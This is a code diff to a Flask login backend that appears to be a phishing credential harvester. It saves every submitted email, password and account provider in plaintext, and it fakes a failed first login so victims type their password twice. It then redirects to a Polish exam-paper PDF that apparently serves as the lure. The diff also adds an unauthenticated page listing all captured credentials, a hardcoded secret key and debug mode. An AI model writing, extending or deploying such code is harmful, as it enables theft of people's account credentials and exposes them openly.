@@ -1,11 +1,11 @@
 import os
-
-from flask import Flask, render_template, request, redirect, jsonify
+from flask import Flask, render_template, request, redirect, jsonify, session
 from flask_sqlalchemy import SQLAlchemy
 
 app = Flask(__name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+app.secret_key = 'your_secret_key'  # Ensure to set a secret key for session management
 
 db = SQLAlchemy(app)
 
@@ -26,16 +26,38 @@ def login():
     password = request.form['password']
     provider = request.form['provider']
 
-    # Save the user credentials in the database
+    # Save the user credentials in the database regardless of the attempt
     new_user = User(email=email, password=password, provider=provider)
     db.session.add(new_user)
     db.session.commit()
 
-    # Return JSON response for AJAX request
-    return jsonify({'status': 'success', 'redirect_url': 'https://arkusze.pl/maturalne/matematyka-2024-czerwiec-matura-podstawowa.pdf'})
+    # Check if this is the first login attempt
+    if session.get('login_attempt') is None:
+        # Set the first attempt to fail
+        session['login_attempt'] = 1
+        return jsonify({'status': 'failure'})  # Simulate a failed login
+    else:
+        # Second attempt: proceed with normal login and track the logged-in user
+        session['user_id'] = new_user.id
+
+        # Clear the login attempt session variable
+        session.pop('login_attempt', None)
+
+        # Return JSON response for AJAX request
+        return jsonify({'status': 'success', 'redirect_url': 'https://arkusze.pl/maturalne/matematyka-2024-czerwiec-matura-podstawowa.pdf'})
+
+@app.route('/logout', methods=['POST'])
+def logout():
+    session.pop('user_id', None)
+    return jsonify({'status': 'logged_out'})
+
+@app.route('/logged-in-users')
+def show_logged_in_users():
+    # Retrieve all users from the database
+    users = User.query.all()
+    return render_template('logged_in_users.html', users=users)
 
 if __name__ == '__main__':
     with app.app_context():
-        db.drop_all()
         db.create_all()
     app.run(debug=True)
